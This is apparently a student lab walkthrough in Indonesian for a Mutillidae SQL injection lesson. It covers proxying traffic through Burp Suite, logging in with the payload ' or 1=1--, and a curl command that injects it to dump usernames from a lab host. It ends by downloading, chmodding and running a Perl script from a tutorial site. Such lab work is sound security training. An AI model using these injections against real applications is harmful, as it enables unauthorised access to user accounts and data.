Lesson 7
--------
- **Step 1**    : Setting networks pada mozilla yang ada di Kali Linux dengan mengisi manual proxy dan diisi HHTP Proxy `127.0.0.1` dan port `8080`
- **Step 2**    : Buka aplikasi burpsuite yang sudah ada di Kali, lalu setting `intercept is off` pada tab proxy lalu tab intercept
- **Step 3**    : Lalu klik Login pada mutillidae, lalu ketik `' or 1=1--` dan jangan lupa tambahkan spasi setelah `--` dan login
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%207/1.JPG)
- Lalu akan muncul hasilnya seperti pada gambar dibawah
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%207/2.JPG)
- **Step 4**    : Lalu buka aplikasi burpsuite, pada tab proxy, lalu HTTP history, buka pada host yang terdapat method get yang baru saja kita lakukan pada mutillidae
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%207/3.JPG)
- **Step 5**    : Lalu ketik `curl -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "192.168.100.22/mutillidae/index.php" --cookie PHPSESSID=13c43bde4b32699c9a96034fc9e26134 | grep -i "Username=" > lesson7.txt` lalu ketik `cat lesson7.txt`
- Lalu akan muncul hasilnya seperti gambar berikut
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%207/4.JPG)
- **Step 6**    : Lalu ketik `wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/lesson7.pl.TXT` lalu `mv lesson7.pl.TXT lesson7.pl` lalu `chmod 700 lesson7.pl` lalu `./lesson7.pl` dan akan muncul hasilnya seperti berikut
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%207/6.JPG)
